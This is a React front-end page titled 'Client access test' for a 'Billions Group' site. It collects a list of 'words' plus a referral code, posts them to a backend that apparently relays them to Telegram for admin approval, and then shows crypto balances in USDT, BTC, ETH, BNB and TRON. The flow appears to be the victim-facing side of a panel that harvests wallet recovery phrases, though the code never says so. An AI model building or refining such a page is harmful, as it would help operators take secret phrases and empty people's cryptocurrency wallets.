import { useEffect, useMemo, useState } from 'react'
import api, { apiErrorMessage } from '../api/adminApi.js'

const sampleWords = 'market river window signal yellow carbon silver garden orbit velvet anchor'
const assets = ['usdt', 'btc', 'eth', 'bnb', 'tron']

function normalizeWords(value) {
  return String(value || '')
    .split(/[\s,]+/)
    .map(word => word.trim())
    .filter(Boolean)
}

function formatMoney(value) {
  if (value == null) return 'Waiting'
  return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(Number(value || 0))
}

function BalanceList({ balances = {} }) {
  return (
    <div className="client-balances">
      {assets.map(asset => (
        <div key={asset}>
          <span>{asset.toUpperCase()}</span>
          <strong>{Number(balances[asset] || 0).toLocaleString(undefined, { maximumFractionDigits: 8 })}</strong>
        </div>
      ))}
    </div>
  )
}

export default function ClientPage() {
  const [title, setTitle] = useState('Client visit test')
  const [words, setWords] = useState(sampleWords)
  const [batch, setBatch] = useState(null)
  const [account, setAccount] = useState(null)
  const [status, setStatus] = useState('')
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [checking, setChecking] = useState(false)
  const wordCount = useMemo(() => normalizeWords(words).length, [words])
  const referralCode = useMemo(() => new URLSearchParams(window.location.search).get('ref') || '', [])

  async function submitWords(event) {
    event.preventDefault()
    setSubmitting(true)
    setError('')
    setStatus('')
    setAccount(null)

    try {
      const { data } = await api.post('/words', {
        title,
        words,
        referral: referralCode || undefined,
      })
      setBatch(data.batch)
      if (data.batch?.account) {
        setAccount(data.batch.account)
        setStatus('Approved account found. The client is signed in.')
      } else {
        setStatus(data.telegram?.message || 'Words submitted for approval.')
      }
    } catch (requestError) {
      setError(apiErrorMessage(requestError))
    } finally {
      setSubmitting(false)
    }
  }

  async function checkStatus() {
    if (!batch?.id) return
    setChecking(true)
    setError('')
    try {
      const { data } = await api.get(`/words/${batch.id}/status`)
      setBatch(data.batch)
      if (data.batch?.account) {
        setAccount(data.batch.account)
        setStatus('Approved account found. The client is signed in.')
      } else {
        setStatus(`Current status: ${data.batch?.approvalStatus || 'pending'}`)
      }
    } catch (requestError) {
      setError(apiErrorMessage(requestError))
    } finally {
      setChecking(false)
    }
  }

  async function loginWithWords() {
    setChecking(true)
    setError('')
    try {
      const { data } = await api.post('/words/auto-login', { words })
      setAccount(data.account)
      setBatch(data.account?.batch || batch)
      setStatus('Client login complete.')
    } catch (requestError) {
      setError(apiErrorMessage(requestError))
    } finally {
      setChecking(false)
    }
  }

  useEffect(() => {
    if (!batch?.id || batch.approvalStatus !== 'pending' || account) return undefined
    const timer = window.setInterval(checkStatus, 8000)
    return () => window.clearInterval(timer)
  }, [batch?.id, batch?.approvalStatus, account])

  return (
    <main className="client-page">
      <section className="client-hero">
        <div className="client-copy">
          <span className="eyebrow">Billions Group</span>
          <h1>Client access test</h1>
          <p>Submit a word set, wait for admin approval, then enter the same words to open the account view.</p>
          {referralCode && <p className="client-referral">Referral test active: <code>{referralCode}</code></p>}
        </div>
        <form className="client-form" onSubmit={submitWords}>
          <label>
            Account label
            <input value={title} maxLength={255} onChange={event => setTitle(event.target.value)} />
          </label>
          <label>
            Words
            <textarea rows={7} value={words} onChange={event => setWords(event.target.value)} />
          </label>
          <div className="client-form-footer">
            <span>{wordCount} words</span>
            <button className="primary-button" type="submit" disabled={submitting || wordCount === 0}>
              {submitting ? 'Submitting...' : 'Submit words'}
            </button>
          </div>
        </form>
      </section>

      {(error || status || batch) && (
        <section className="client-status-panel">
          {error && <p className="alert error" role="alert">{error}</p>}
          {status && <p className="alert success" role="status">{status}</p>}
          {batch && (
            <div className="client-status-grid">
              <div>
                <span>Batch</span>
                <strong>#{batch.id}</strong>
              </div>
              <div>
                <span>Status</span>
                <strong>{batch.approvalStatus || 'pending'}</strong>
              </div>
              <div>
                <span>Words</span>
                <strong>{batch.wordCount || wordCount}</strong>
              </div>
            </div>
          )}
          <div className="client-actions">
            <button className="secondary-button" type="button" disabled={!batch?.id || checking} onClick={checkStatus}>
              {checking ? 'Checking...' : 'Check status'}
            </button>
            <button className="secondary-button" type="button" disabled={checking || wordCount === 0} onClick={loginWithWords}>
              Login with words
            </button>
          </div>
        </section>
      )}

      {account && (
        <section className="client-account">
          <div>
            <span className="eyebrow">Account</span>
            <h2>{account.title || 'Approved client account'}</h2>
            <p>{account.accountNumber}</p>
          </div>
          <strong className="client-total">{formatMoney(account.totalUsd)}</strong>
          <BalanceList balances={account.balances} />
        </section>
      )}
    </main>
  )
}
